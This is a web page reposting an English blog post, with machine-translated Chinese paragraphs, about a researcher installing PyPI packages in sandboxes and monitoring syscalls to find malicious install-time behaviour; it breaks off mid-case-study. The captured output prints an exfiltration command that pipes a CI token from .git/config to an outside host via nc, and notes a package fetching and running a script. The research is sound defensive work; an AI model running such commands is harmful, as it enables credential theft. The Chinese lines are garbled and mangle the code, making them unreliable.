<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>åœ¨PyPIä¸Šæœç´¢æ¶æ„ç¨‹åºåŒ…</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">åœ¨PyPIä¸Šæœç´¢æ¶æ„ç¨‹åºåŒ…</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-11-14 02:24:23</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2020/11/b87c337b058d6b8e5d57c3a283b1b8c8.png"><img src="http://img2.diglog.com/img/2020/11/b87c337b058d6b8e5d57c3a283b1b8c8.png" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>About a year ago, the Python Software Foundation  opened a Request for Information (RFI) to discuss how we could detect malicious packages being uploaded to PyPI. Whether itâ€™s  taking over abandoned packages,  typosquatting on popular libraries, or  hijacking packages using credential stuffing, itâ€™s clear this is a real issue affecting nearly every package manager.</p><p>å¤§çº¦ä¸€å¹´å‰ï¼ŒPythonè½¯ä»¶åŸºé‡‘ä¼š(Python Software Foundation)å‘èµ·äº†ä¸€é¡¹ä¿¡æ¯è¯·æ±‚(RFI)ï¼Œè®¨è®ºå¦‚ä½•æ£€æµ‹ä¸Šä¼ åˆ°PyPIçš„æ¶æ„åŒ…ã€‚æ— è®ºæ˜¯æ¥ç®¡è¢«é—å¼ƒçš„åŒ…ï¼Œè¿˜æ˜¯åœ¨æµè¡Œçš„åº“ä¸Šæ‹¼å­—ï¼Œè¿˜æ˜¯ä½¿ç”¨å‡­æ®å¡«å……åŠ«æŒåŒ…ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸€ä¸ªå½±å“åˆ°å‡ ä¹æ¯ä¸ªåŒ…ç®¡ç†å™¨çš„çœŸæ­£é—®é¢˜ã€‚</p><p>  The truth is that package managers like PyPI are critical infrastructure that almost every company relies on. I could write for days on this topic, but Iâ€™ll just let this xkcd suffice for now.</p><p>äº‹å®æ˜¯ï¼ŒåƒPyPIè¿™æ ·çš„åŒ…ç®¡ç†å™¨æ˜¯å‡ ä¹æ‰€æœ‰å…¬å¸éƒ½ä¾èµ–çš„å…³é”®åŸºç¡€è®¾æ–½ã€‚æˆ‘å¯ä»¥åœ¨è¿™ä¸ªä¸»é¢˜ä¸Šå†™ä¸Šå‡ å¤©ï¼Œä½†æˆ‘ç°åœ¨å°±è®©è¿™ä¸ªxkcdè¶³å¤Ÿäº†ã€‚</p><p>  This is an area of interest for me, so I responded with  my thoughts on how we could approach this. While the entire post is well-cited, beautiful prose that you should go read, one thing stuck with me: considering what happens as soon as a package is installed.</p><p>è¿™æ˜¯æˆ‘æ„Ÿå…´è¶£çš„ä¸€ä¸ªé¢†åŸŸï¼Œæ‰€ä»¥æˆ‘å›åº”äº†æˆ‘å¯¹å¦‚ä½•å¤„ç†è¿™ä¸€é—®é¢˜çš„æƒ³æ³•ã€‚è™½ç„¶æ•´ç¯‡å¸–å­éƒ½æ˜¯è¢«å¹¿æ³›å¼•ç”¨çš„ç¾ä¸½æ•£æ–‡ï¼Œä½ åº”è¯¥å»è¯»ä¸€è¯»ï¼Œä½†æœ‰ä¸€ä»¶äº‹è®©æˆ‘å°è±¡æ·±åˆ»ï¼šè€ƒè™‘ä¸€ä¸‹å®‰è£…äº†ä¸€ä¸ªåŒ…åä¼šå‘ç”Ÿä»€ä¹ˆã€‚</p><p> While it might be necessary for some setup activities, things like establishing network connections or executing commands during the  pip install process should always be viewed with a ğŸ¤¨, since it doesnâ€™t give the developer much of a chance to inspect the code before bad things happen.</p><p>è™½ç„¶è¿™å¯¹äºæŸäº›å®‰è£…æ´»åŠ¨å¯èƒ½æ˜¯å¿…è¦çš„ï¼Œä½†åœ¨PIPå®‰è£…è¿‡ç¨‹ä¸­å»ºç«‹ç½‘ç»œè¿æ¥æˆ–æ‰§è¡Œå‘½ä»¤ä¹‹ç±»çš„äº‹æƒ…åº”è¯¥å§‹ç»ˆä½¿ç”¨ğŸ¤¨è¿›è¡ŒæŸ¥çœ‹ï¼Œå› ä¸ºè¿™ä¸ä¼šè®©å¼€å‘äººå‘˜æœ‰å¤ªå¤šæœºä¼šåœ¨ä¸å¥½çš„äº‹æƒ…å‘ç”Ÿä¹‹å‰æ£€æŸ¥ä»£ç ã€‚</p><p> I wanted to explore this further, so in this post Iâ€™m going to walk through how I installed and analyzed every package in PyPI looking for malicious activity.</p><p>æˆ‘æƒ³è¿›ä¸€æ­¥æ¢è®¨è¿™ä¸€ç‚¹ï¼Œæ‰€ä»¥åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å°†è¯¦ç»†ä»‹ç»æˆ‘æ˜¯å¦‚ä½•å®‰è£…å’Œåˆ†æPyPIä¸­çš„æ¯ä¸ªåŒ…ä»¥æŸ¥æ‰¾æ¶æ„æ´»åŠ¨çš„ã€‚</p><p>  To run arbitrary commands during installation, authors typically add code to the  setup.py file in their package. You can see some examples in  this repository.</p><p>è¦åœ¨å®‰è£…æœŸé—´è¿è¡Œä»»æ„å‘½ä»¤ï¼Œä½œè€…é€šå¸¸ä¼šå‘å…¶åŒ…ä¸­çš„setup.pyæ–‡ä»¶æ·»åŠ ä»£ç ã€‚æ‚¨å¯ä»¥åœ¨æ­¤å­˜å‚¨åº“ä¸­çœ‹åˆ°ä¸€äº›ç¤ºä¾‹ã€‚</p><p> At a high-level, there are two things you can do to find potentially malicious dependencies: you can look through the code for bad things (static analysis), or you can live dangerously and just install them to see what happens (dynamic analysis).</p><p>ä»é«˜å±‚æ¬¡ä¸Šè®²ï¼Œæœ‰ä¸¤ä»¶äº‹å¯ä»¥æ‰¾åˆ°æ½œåœ¨çš„æ¶æ„ä¾èµ–é¡¹ï¼šæ‚¨å¯ä»¥æŸ¥çœ‹ä»£ç ä¸­çš„åå¤„(é™æ€åˆ†æ)ï¼Œæˆ–è€…æ‚¨å¯ä»¥å†’é™©åœ°å®‰è£…å®ƒä»¬ï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆ(åŠ¨æ€åˆ†æ)ã€‚</p><p> While static analysis is super interesting (heck, I  found malicious packages on npm using artisanal  greping), for this post Iâ€™ll focus on dynamic analysis. After all, I think itâ€™s a bit more robust since youâ€™re looking at what  actually happens instead of just looking for bad things that could happen.</p><p>è™½ç„¶é™æ€åˆ†æéå¸¸æœ‰è¶£(è§é¬¼ï¼Œæˆ‘åœ¨NPMä¸Šå‘ç°äº†ä½¿ç”¨æ‰‹å·¥è´ªå©ªçš„æ¶æ„åŒ…)ï¼Œä½†åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å°†é‡ç‚¹æ”¾åœ¨åŠ¨æ€åˆ†æä¸Šã€‚æ¯•ç«Ÿï¼Œæˆ‘è®¤ä¸ºå®ƒæ›´ç¨³å¥ä¸€äº›ï¼Œå› ä¸ºä½ çœ‹çš„æ˜¯å®é™…å‘ç”Ÿçš„äº‹æƒ…ï¼Œè€Œä¸æ˜¯ä»…ä»…å¯»æ‰¾å¯èƒ½å‘ç”Ÿçš„åäº‹ã€‚</p><p>   Generally, anytime something important happens itâ€™s done by the kernel. Normal programs (like  pip) that want to do important things through the kernel do so through the use of  syscalls. Opening files, establishing network connections, and executing commands are all done using syscalls!</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œä»»ä½•æ—¶å€™å‘ç”Ÿé‡è¦çš„äº‹æƒ…éƒ½æ˜¯ç”±å†…æ ¸å®Œæˆçš„ã€‚æƒ³è¦é€šè¿‡å†…æ ¸åšé‡è¦äº‹æƒ…çš„æ™®é€šç¨‹åº(æ¯”å¦‚pip)æ˜¯é€šè¿‡ä½¿ç”¨syscallæ¥å®ç°çš„ã€‚æ‰“å¼€æ–‡ä»¶ã€å»ºç«‹ç½‘ç»œè¿æ¥å’Œæ‰§è¡Œå‘½ä»¤éƒ½æ˜¯ä½¿ç”¨syscallå®Œæˆçš„ï¼</p><p>   This means that if we can watch syscalls during the installation of a Python package, we can see if anything suspicious occurs. The benefit is that it doesnâ€™t matter how obfuscated the code is- weâ€™ll see what actually happens.</p><p>è¿™æ„å‘³ç€ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨å®‰è£…PythonåŒ…çš„è¿‡ç¨‹ä¸­ç›‘è§†syscallï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æ˜¯å¦å‘ç”Ÿäº†ä»»ä½•å¯ç–‘çš„äº‹æƒ…ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œä¸ç®¡ä»£ç å¤šä¹ˆæ¨¡ç³Šï¼Œæˆ‘ä»¬éƒ½ä¼šçœ‹åˆ°å®é™…å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p><p> Itâ€™s important to note that the idea of watching syscalls isnâ€™t something I came up with. Folks like  Adam Baldwin have been talking about this  since 2017. And there was an  excellent paper published by researchers from the Georgia Institute of Technology that took this same approach, among others. Honestly, most of this blog post is just trying to reproduce their work.</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç›‘è§†syscallçš„æƒ³æ³•ä¸æ˜¯æˆ‘æƒ³å‡ºæ¥çš„ã€‚äºšå½“Â·é²å¾·æ¸©(Adam Baldwin)ç­‰äººè‡ª2017å¹´ä»¥æ¥ä¸€ç›´åœ¨è®¨è®ºè¿™ä¸ªé—®é¢˜ã€‚ä½æ²»äºšç†å·¥å­¦é™¢çš„ç ”ç©¶äººå‘˜å‘è¡¨äº†ä¸€ç¯‡å‡ºè‰²çš„è®ºæ–‡ï¼Œå…¶ä¸­å°±é‡‡ç”¨äº†åŒæ ·çš„æ–¹æ³•ã€‚è€å®è¯´ï¼Œè¿™ç¯‡åšæ–‡çš„å¤§éƒ¨åˆ†å†…å®¹åªæ˜¯è¯•å›¾å¤åˆ¶ä»–ä»¬çš„ä½œå“ã€‚</p><p> So we know we want to monitor syscalls - how exactly do we do that?</p><p>æ‰€ä»¥æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬æƒ³è¦ç›‘æ§syscall-æˆ‘ä»¬å…·ä½“å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹ï¼Ÿ</p><p>  There are a number of tools designed to let you watch syscalls. For this project I used  sysdig since it provides both structured output and some really nice filtering capabilities.</p><p>æœ‰è®¸å¤šå·¥å…·å¯ä»¥è®©æ‚¨æŸ¥çœ‹syscallã€‚å¯¹äºè¿™ä¸ªé¡¹ç›®ï¼Œæˆ‘ä½¿ç”¨äº†sysdiggï¼Œå› ä¸ºå®ƒæ—¢æä¾›äº†ç»“æ„åŒ–è¾“å‡ºï¼Œä¹Ÿæä¾›äº†ä¸€äº›éå¸¸å¥½çš„è¿‡æ»¤åŠŸèƒ½ã€‚</p><p> To make this work, when starting the Docker container that installs the package, I also started a sysdig process that only monitors events from that container. I also filtered out network reads/writes that are going to/from  pypi.org or  files.pythonhosted.com since I didnâ€™t want to fill the logs with traffic related to package downloads.</p><p>ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œåœ¨å¯åŠ¨å®‰è£…åŒ…çš„Dockerå®¹å™¨æ—¶ï¼Œæˆ‘è¿˜å¯åŠ¨äº†ä¸€ä¸ªä»…ç›‘è§†æ¥è‡ªè¯¥å®¹å™¨çš„äº‹ä»¶çš„sysdiggè¿›ç¨‹ã€‚æˆ‘è¿˜è¿‡æ»¤æ‰äº†å¾€è¿”äºpypi.orgæˆ–files.pythonhosted.comçš„ç½‘ç»œè¯»/å†™ï¼Œå› ä¸ºæˆ‘ä¸æƒ³åœ¨æ—¥å¿—ä¸­å¡«æ»¡ä¸åŒ…ä¸‹è½½ç›¸å…³çš„æµé‡ã€‚</p><p> With a way to capture syscalls, I had to solve another problem: how to get a list of all PyPI packages.</p><p>æœ‰äº†æ•è·syscallçš„æ–¹æ³•ï¼Œæˆ‘å¿…é¡»è§£å†³å¦ä¸€ä¸ªé—®é¢˜ï¼šå¦‚ä½•è·å¾—æ‰€æœ‰PyPIåŒ…çš„åˆ—è¡¨ã€‚</p><p>  Fortunately for us, PyPI has an API called the  â€œSimple APIâ€ that can also be thought of as â€œa very big HTML page with a link to every packageâ€ since thatâ€™s what it is. Itâ€™s simple, clean, and better than any HTML I can probably write.</p><p>å¯¹æˆ‘ä»¬æ¥è¯´å¹¸è¿çš„æ˜¯ï¼ŒPyPIæœ‰ä¸€ä¸ªåä¸ºâ€œç®€å•APIâ€çš„APIï¼Œå®ƒä¹Ÿå¯ä»¥è¢«è®¤ä¸ºæ˜¯â€œä¸€ä¸ªéå¸¸å¤§çš„HTMLé¡µé¢ï¼Œæ¯ä¸ªåŒ…éƒ½æœ‰ä¸€ä¸ªé“¾æ¥â€ï¼Œå› ä¸ºå®ƒå°±æ˜¯è¿™æ ·ã€‚å®ƒç®€å•ã€å¹²å‡€ï¼Œè€Œä¸”æ¯”æˆ‘å¯èƒ½ç¼–å†™çš„ä»»ä½•HTMLéƒ½è¦å¥½ã€‚</p><p> We can grab this page and parse out all the links using  pup, giving us right around 268,000 packages:</p><p>æˆ‘ä»¬å¯ä»¥æŠ“å–è¿™ä¸ªé¡µé¢ï¼Œå¹¶ä½¿ç”¨PUPè§£æå‡ºæ‰€æœ‰é“¾æ¥ï¼Œç»™å‡ºå¤§çº¦268,000ä¸ªåŒ…ï¼š</p><p> â¯ curl https://pypi.org/simple/ | pup &#39;a text{}&#39; &gt; pypi_full.txt â¯ wc -l pypi_full.txt 268038 pypi_full.txt</p><p>Pypi curl https://pypi.org/simple/|â¯ï¼›aæ–‡æœ¬{}&gtï¼›pypi_full.txtâ¯wc-l pypi_full.txt 268038 pypi_full.txtã€‚</p><p> For this experiment, Iâ€™ll only care about the latest release of each package. Itâ€™s possible that thereâ€™s malicious versions of packages buried in older releases, but the AWS bill isnâ€™t going to pay itself.</p><p>å¯¹äºè¿™ä¸ªå®éªŒï¼Œæˆ‘åªå…³å¿ƒæ¯ä¸ªåŒ…çš„æœ€æ–°ç‰ˆæœ¬ã€‚æœ‰å¯èƒ½åœ¨æ—§ç‰ˆæœ¬ä¸­éšè—äº†æ¶æ„ç‰ˆæœ¬çš„åŒ…ï¼Œä½†AWSçš„è´¦å•ä¸ä¼šä¸ºæ­¤ä¹°å•ã€‚</p><p>   In a nutshell, weâ€™re sending each package name to a set of EC2 instances (Iâ€™d love to use Fargate or something in the future but I also donâ€™t know Fargate, soâ€¦) which fetches some metadata about the package from PyPI, then starts sysdig as well as a series of containers to  pip install the package while syscalls and network traffic were being collected. Then, all of the data is shipped up to S3 for future-Jordan to worry about.</p><p>ç®€è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬å°†æ¯ä¸ªåŒ…çš„åç§°å‘é€åˆ°ä¸€ç»„ec2å®ä¾‹(æˆ‘å¸Œæœ›å°†æ¥ä½¿ç”¨Fargateæˆ–å…¶ä»–ä¸œè¥¿ï¼Œä½†æˆ‘ä¹Ÿä¸çŸ¥é“Fargateï¼Œæ‰€ä»¥â€¦)ã€‚å®ƒä»PyPIè·å–ä¸€äº›å…³äºåŒ…çš„å…ƒæ•°æ®ï¼Œç„¶åå¯åŠ¨sysdiggä»¥åŠä¸€ç³»åˆ—å®¹å™¨ï¼Œä»¥ä¾¿åœ¨æ”¶é›†syscallå’Œç½‘ç»œæµé‡æ—¶ä»¥pipæ–¹å¼å®‰è£…åŒ…ã€‚ç„¶åï¼Œæ‰€æœ‰æ•°æ®éƒ½è¢«å‘é€åˆ°S3ï¼Œä»¥å¤‡å°†æ¥çš„çº¦æ—¦æ“å¿ƒã€‚</p><p>    Once this was complete, I had about a terabyte of data sitting in an S3 bucket covering around 245,000 packages. A few packages didnâ€™t have a published version, and some had various processing errors but this felt like a great sample set to work from.</p><p>å®Œæˆåï¼Œæˆ‘åœ¨S3å­˜å‚¨æ¡¶ä¸­å­˜å‚¨äº†å¤§çº¦1TBçš„æ•°æ®ï¼Œæ¶µç›–äº†å¤§çº¦245,000ä¸ªåŒ…ã€‚æœ‰å‡ ä¸ªåŒ…æ²¡æœ‰å‘å¸ƒç‰ˆæœ¬ï¼Œæœ‰äº›åŒ…æœ‰å„ç§å¤„ç†é”™è¯¯ï¼Œä½†è¿™æ„Ÿè§‰åƒæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ ·ä¾‹é›†ã€‚</p><p>  I merged the metadata and the output, giving me a series of JSON files that looked like this:</p><p>æˆ‘åˆå¹¶äº†å…ƒæ•°æ®å’Œè¾“å‡ºï¼Œå¾—åˆ°äº†ä¸€ç³»åˆ—å¦‚ä¸‹æ‰€ç¤ºçš„JSONæ–‡ä»¶ï¼š</p><p> {  &#34;metadata&#34; :  {},  &#34;output&#34; :  {  &#34;dns&#34; :  [],  //  Any  DNS  requests  made  &#34;files&#34; :  [],  //  All  file  access  operations  &#34;connections&#34; :  [],  //  TCP  connections  established  &#34;commands&#34; :  [],  //  Any  commands  executed  } }</p><p>{&#34ï¼›METADATA&#34ï¼›ï¼š{}ï¼Œ&#34ï¼›è¾“å‡º&#34ï¼›ï¼š{&#34ï¼›DNS&#34ï¼›ï¼š[]ï¼Œ//å‘å‡ºçš„æ‰€æœ‰DNSè¯·æ±‚&#34ï¼›æ–‡ä»¶&#34ï¼›ï¼š[]ï¼Œ//æ‰€æœ‰æ–‡ä»¶è®¿é—®æ“ä½œ&#34ï¼›è¿æ¥&#34ï¼›ï¼š[]ï¼Œ//å»ºç«‹çš„TCPè¿æ¥&#34ï¼›å‘½ä»¤&#34ï¼›ï¼š[]ï¼Œ//æ‰§è¡Œçš„ä»»ä½•å‘½ä»¤}}ã€‚</p><p> I then wrote a series of scripts to start aggregating the data, trying to get a sense of whatâ€™s benign and whatâ€™s malicious. Letâ€™s dig into some of the results.</p><p>ç„¶åï¼Œæˆ‘ç¼–å†™äº†ä¸€ç³»åˆ—è„šæœ¬æ¥å¼€å§‹èšåˆæ•°æ®ï¼Œè¯•å›¾äº†è§£å“ªäº›æ˜¯è‰¯æ€§çš„ï¼Œå“ªäº›æ˜¯æ¶æ„çš„ã€‚è®©æˆ‘ä»¬æ·±å…¥ç ”ç©¶ä¸€ä¸‹å…¶ä¸­çš„ä¸€äº›ç»“æœã€‚</p><p>  There are a number of reasons why a package would need to make a network connection during the installation process. They might need to download legitimate binary components or other resources, they might be a form of analytics, or they may be trying to exfiltrate data or credentials from the system.</p><p>åŒ…åœ¨å®‰è£…è¿‡ç¨‹ä¸­éœ€è¦å»ºç«‹ç½‘ç»œè¿æ¥çš„åŸå› æœ‰å¾ˆå¤šã€‚ä»–ä»¬å¯èƒ½éœ€è¦ä¸‹è½½åˆæ³•çš„äºŒè¿›åˆ¶ç»„ä»¶æˆ–å…¶ä»–èµ„æºï¼Œå®ƒä»¬å¯èƒ½æ˜¯ä¸€ç§åˆ†æå½¢å¼ï¼Œæˆ–è€…ä»–ä»¬å¯èƒ½è¯•å›¾ä»ç³»ç»Ÿä¸­çªƒå–æ•°æ®æˆ–å‡­æ®ã€‚</p><p> The results found 460 packages making network connections to 109 unique hosts. Just like the paper above mentions, quite a few of these are the result of packages sharing a dependency that makes the network connection. Itâ€™s possible to filter these out by mapping dependencies, but I havenâ€™t done that here.</p><p>ç»“æœå‘ç°ï¼Œæœ‰460ä¸ªåŒ…ä¸109å°ä¸åŒçš„ä¸»æœºå»ºç«‹äº†ç½‘ç»œè¿æ¥ã€‚å°±åƒä¸Šé¢æåˆ°çš„ï¼Œå…¶ä¸­ç›¸å½“å¤šæ˜¯åŒ…å…±äº«å»ºç«‹ç½‘ç»œè¿æ¥çš„ä¾èµ–å…³ç³»çš„ç»“æœã€‚å¯ä»¥é€šè¿‡æ˜ å°„ä¾èµ–é¡¹æ¥è¿‡æ»¤è¿™äº›å†…å®¹ï¼Œä½†æˆ‘åœ¨è¿™é‡Œè¿˜æ²¡æœ‰åšåˆ°è¿™ä¸€ç‚¹ã€‚</p><p>   Like network connections, there are legitimate reasons for packages to run system commands during installation. This could be to compile native binaries, setup the right environment, and more.</p><p>ä¸ç½‘ç»œè¿æ¥ä¸€æ ·ï¼ŒåŒ…åœ¨å®‰è£…æœŸé—´è¿è¡Œç³»ç»Ÿå‘½ä»¤ä¹Ÿæœ‰æ­£å½“ç†ç”±ã€‚è¿™å¯ä»¥æ˜¯ç¼–è¯‘æœ¬æœºäºŒè¿›åˆ¶æ–‡ä»¶ã€è®¾ç½®æ­£ç¡®çš„ç¯å¢ƒç­‰ç­‰ã€‚</p><p> Looking across our sample set, 60,725 packages are found to be executing commands during installation. And just like network connections, we have to keep in mind that many of these will be the result of a downstream dependency being the package that runs the commands.</p><p>æŸ¥çœ‹æˆ‘ä»¬çš„æ ·ä¾‹é›†ï¼Œå‘ç°æœ‰60,725ä¸ªåŒ…åœ¨å®‰è£…æœŸé—´æ‰§è¡Œå‘½ä»¤ã€‚å°±åƒç½‘ç»œè¿æ¥ä¸€æ ·ï¼Œæˆ‘ä»¬å¿…é¡»è®°ä½ï¼Œå…¶ä¸­è®¸å¤šè¿æ¥å°†æ˜¯è¿è¡Œå‘½ä»¤çš„åŒ…çš„ä¸‹æ¸¸ä¾èµ–çš„ç»“æœã€‚</p><p>  Digging into the results, most network connections and commands appeared to be legitimate, as expected. But there were a few instances of odd behavior I wanted to call out as case studies to show how useful this type of analysis can be.</p><p>æ·±å…¥è°ƒæŸ¥ç»“æœï¼Œæ­£å¦‚é¢„æœŸçš„é‚£æ ·ï¼Œå¤§å¤šæ•°ç½‘ç»œè¿æ¥å’Œå‘½ä»¤ä¼¼ä¹éƒ½æ˜¯åˆæ³•çš„ã€‚ä½†æœ‰å‡ ä¸ªå¥‡æ€ªè¡Œä¸ºçš„ä¾‹å­ï¼Œæˆ‘æƒ³æŠŠå®ƒä»¬ä½œä¸ºæ¡ˆä¾‹ç ”ç©¶ï¼Œæ¥å±•ç¤ºè¿™ç§ç±»å‹çš„åˆ†ææœ‰å¤šæœ‰ç”¨ã€‚</p><p>  One package called  i-am-malicious appears to be a proof-of-concept of a malicious package. Here are the interesting details that give us an idea that the package is worth investigating (if the name werenâ€™t enough ğŸ˜‰):</p><p>ä¸€ä¸ªåä¸ºi-am-æ¶æ„çš„åŒ…ä¼¼ä¹æ˜¯æ¶æ„åŒ…çš„æ¦‚å¿µè¯æ˜ã€‚ä¸‹é¢æ˜¯ä¸€äº›æœ‰è¶£çš„ç»†èŠ‚ï¼Œè®©æˆ‘ä»¬çŸ¥é“è¿™ä¸ªåŒ…æ˜¯å¦å€¼å¾—ç ”ç©¶(å¦‚æœåç§°ä¸å¤ŸğŸ˜‰)ï¼š</p><p> {  &#34;dns&#34; :  [{  &#34;name&#34; :  &#34;gist.githubusercontent.com&#34; ,  &#34;addresses&#34; :  [  &#34;199.232.64.133&#34;  ]  }]  ] ,  &#34;files&#34; :  [  ...  {  &#34;filename&#34; :  &#34;/tmp/malicious.py&#34; ,  &#34;flag&#34; :  &#34;O_RDONLY|O_CLOEXEC&#34;  },  ...  {  &#34;filename&#34; :  &#34;/tmp/malicious-was-here&#34; ,  &#34;flag&#34; :  &#34;O_TRUNC|O_CREAT|O_WRONLY|O_CLOEXEC&#34;  },  ...  ],  &#34;commands&#34; :  [  &#34;python /tmp/malicious.py&#34;  ] }</p><p>{&#34ï¼›dns&#34ï¼›ï¼š[{&#34ï¼›åç§°&#34ï¼›ï¼š&#34ï¼›gist.githubusercontent.com&#34ï¼›ï¼Œ&#34ï¼›åœ°å€&#34ï¼›ï¼š[&#34ï¼›199.232.64.133&#34ï¼›]}]]ï¼Œ&#34ï¼›æ–‡ä»¶&#34ï¼›ï¼š[...{&#34ï¼›æ–‡ä»¶å&#34ï¼›ï¼š&#34ï¼›/tmp/malicious.py&#34ï¼›ï¼Œ&#34ï¼›æ ‡å¿—&#34ï¼›ï¼š&#34ï¼›O_RDONLY|O_CLOEXEC&#34ï¼›}ï¼Œ...{&#34ï¼›æ–‡ä»¶å&#34ï¼›ï¼š&#34ï¼›/tmp/æ¶æ„-is-here&#34ï¼›ï¼Œ&#34ï¼›æ ‡å¿—&#34ï¼›ï¼š&#34ï¼›O_TRUNC|O_CREAT|O_WRONLY|O_CLOEXEC&#34ï¼›}ï¼Œ...]ï¼Œ&#34ï¼›å‘½ä»¤ã€‚Python/tmp/malicious.py&#34ï¼›]}ã€‚</p><p> We can already get some sense of whatâ€™s happening here. We see a connection made to  gist.github.com, a Python file being executed, and a file named  /tmp/malicious-was-here being created. Sure enough, thatâ€™s exactly whatâ€™s happening in the  setup.py:</p><p>æˆ‘ä»¬å·²ç»å¯ä»¥å¯¹è¿™é‡Œå‘ç”Ÿçš„äº‹æƒ…æœ‰ä¸€äº›äº†è§£äº†ã€‚æˆ‘ä»¬çœ‹åˆ°ä¸gist.github.comå»ºç«‹äº†ä¸€ä¸ªè¿æ¥ï¼Œæ­£åœ¨æ‰§è¡Œä¸€ä¸ªPythonæ–‡ä»¶ï¼Œå¹¶åˆ›å»ºäº†ä¸€ä¸ªåä¸º/tmp/æ¶æ„-was-hereçš„æ–‡ä»¶ã€‚æœç„¶ï¼Œè¿™æ­£æ˜¯setup.pyä¸­æ­£åœ¨å‘ç”Ÿçš„äº‹æƒ…ï¼š</p><p>  The   malicious.py in question simply adds an â€œI was hereâ€ type message to  /tmp/malicious-was-here, suggesting this is indeed a proof-of concept.</p><p>æœ‰é—®é¢˜çš„æ¶æ„.pyåªæ˜¯åœ¨/tmp/æ¶æ„-was-hereä¸­æ·»åŠ äº†ä¸€æ¡â€œæˆ‘æ›¾åœ¨è¿™é‡Œâ€ç±»å‹çš„æ¶ˆæ¯ï¼Œè¿™è¡¨æ˜è¿™ç¡®å®æ˜¯ä¸€ä¸ªæ¦‚å¿µè¯æ˜ã€‚</p><p>  Another self-proclaimed malicious package creatively named  maliciouspackage is a bit more nefarious. Hereâ€™s the relevant output:</p><p>å¦ä¸€ä¸ªè‡ªç§°ä¸ºæ¶æ„åŒ…çš„åŒ…è¢«åˆ›é€ æ€§åœ°å‘½åä¸ºMaliciouspackageï¼Œå®ƒçš„é‚ªæ¶ç¨‹åº¦è¦é«˜ä¸€äº›ã€‚ä»¥ä¸‹æ˜¯ç›¸å…³è¾“å‡ºï¼š</p><p> {  &#34;dns&#34; :  [{  &#34;name&#34; :  &#34;laforge.xyz&#34; ,  &#34;addresses&#34; :  [  &#34;34.82.112.63&#34;  ]  }],  &#34;files&#34; :  [  {  &#34;filename&#34; :  &#34;/app/.git/config&#34; ,  &#34;flag&#34; :  &#34;O_RDONLY&#34;  },  ],  &#34;commands&#34; :  [  &#34;sh -c apt install -y socat&#34; ,  &#34;sh -c grep ci-token /app/.git/config | nc laforge.xyz 5566&#34; ,  &#34;grep ci-token /app/.git/config&#34; ,  &#34;nc laforge.xyz 5566&#34;  ] }</p><p>{&#34ï¼›dns&#34ï¼›ï¼š[{&#34ï¼›åç§°&#34ï¼›ï¼š&#34ï¼›laforge.xyz&#34ï¼›ï¼Œ&#34ï¼›åœ°å€&#34ï¼›ï¼š[&#34ï¼›34.82.112.63&#34ï¼›]}]ï¼Œ&#34ï¼›æ–‡ä»¶&#34ï¼›ï¼š[{&#34ï¼›æ–‡ä»¶å&#34ï¼›ï¼š&#34ï¼›/app/.git/config&#34ï¼›ï¼Œ&#34ï¼›æ ‡å¿—&#34ï¼›ï¼š&#34ï¼›O_RDONLY&#34ï¼›}ï¼Œ]ï¼Œ&#34ï¼›å‘½ä»¤&#34ï¼›ï¼š[&#34ï¼›sh-c apt install-yå¥—æ¥å­—&#34ï¼›ï¼Œ&#34ï¼›sh-c grep ci-Token/app/app/.git/config|NC laforge.xyz 5566&#34ï¼›ï¼Œ&#34ï¼›grep ci-Token/app/.git/config&34ï¼›ï¼Œ&#34ï¼›</p><p> As before, our output gives us a decent idea of whatâ€™s going on. In this case, the package appears to extract out a token from the  .git/config file and upload it to  laforge.xyz. Looking through the  setup.py, we see thatâ€™s exactly whatâ€™s happening:</p><p>å’Œä»¥å‰ä¸€æ 